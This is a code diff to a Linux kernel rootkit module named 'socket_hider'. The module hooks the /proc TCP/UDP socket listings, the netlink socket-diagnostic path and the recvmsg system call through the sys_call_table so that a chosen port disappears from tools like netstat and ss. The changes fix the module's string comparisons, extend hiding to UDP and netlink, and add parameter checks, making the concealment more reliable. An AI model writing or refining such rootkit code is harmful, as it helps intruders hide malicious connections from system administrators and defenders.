@@ -62,7 +62,7 @@ struct proc_dir_entry {
           spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
           u8 namelen;
           char name[];
-  };
+};
 
 
 /* Access the port number and if it should be hidden then return 0 else return the original function */
@@ -78,7 +78,7 @@ static int manipulated_tcp_show(struct seq_file* m, void *v)
 	inet = inet_sk(sk);
 	port = ntohs(inet->inet_sport);
 	
-	if(port == port_number && tlp_version == "tcp")
+	if(port == port_number && strcmp(tlp_version, "tcp") == 0)
 	{
 		return 0;
 	}
@@ -101,7 +101,7 @@ static int manipulated_udp_show(struct seq_file* m, void *v)
         inet = inet_sk(sk);
         port = ntohs(inet->inet_sport);
         
-        if(port == port_number)// && tlp_version == "udp")
+	if(port == port_number && strcmp(tlp_version, "udp") == 0)
 	{
                 return 0;
 	}
@@ -116,7 +116,7 @@ static int checkport(struct nlmsghdr *nlh)
     	int lport = ntohs(r->id.idiag_sport);
 	
 		
-	if(lport == port_number) 
+	if(lport == port_number && strcmp(tlp_version, "tcp") == 0) // TODO: check if this works for udp too
 	{
 		printk("matched the version \n");
 		return 1;
@@ -181,9 +181,6 @@ asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags
         }
 	
 	return ret;
-
-	
-//return original_recvmsg(sockfd,msg,flags);
 }
 
 
@@ -223,7 +220,14 @@ static void enable_page_protection (void)
 static int __init hidemodule_init(void)
 {
 	printk(KERN_INFO "Loading socket_hider LKM...\n");
-
+	
+	/* ensure the input protocol is either 'tcp' or 'udp' */
+	if(! (strcmp(tlp_version, "tcp") == 0 || strcmp(tlp_version, "udp") == 0) )
+	{
+		printk(KERN_INFO "You can only hide tcp or udp sockets.");
+		return -EINVAL;
+	}
+	
         /* get the location of the sys_call_table from our sysmap.h file */
         sys_call_table = (void*) sysmap_sys_call_table;
 
